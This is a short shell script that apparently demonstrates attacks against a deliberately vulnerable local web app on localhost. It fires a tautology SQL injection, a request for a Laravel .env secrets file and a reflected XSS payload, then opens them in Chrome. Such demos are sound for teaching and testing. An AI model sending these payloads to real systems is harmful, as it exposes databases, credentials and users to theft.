echo "==========================================="
echo "SQL INJECTION"
echo "http://127.0.0.1:8999/Users?name='%20OR%20'1'='1"
echo
curl "http://127.0.0.1:8999/Users?name='%20OR%20'1'='1"
echo 
echo "==========================================="
echo "Laravel - Sensitive Information Disclosure"
echo 'curl http://127.0.0.1:8999/.env'
echo
curl "http://127.0.0.1:8999/.env"
echo "==========================================="
echo "XSS REFLECTION"
echo "http://127.0.0.1:8999/Users/search?name=<script>alert()</script>"
echo
curl "http://127.0.0.1:8999/Users/search?name=<script>alert()</script>"
echo
read
open -a Google\ Chrome "http://127.0.0.1:8999/.env" &
open -a Google\ Chrome "http://127.0.0.1:8999/Users?name='%20OR%20'1'='1" &
open -a Google\ Chrome "http://127.0.0.1:8999/Users/search?name=<script>alert()</script>"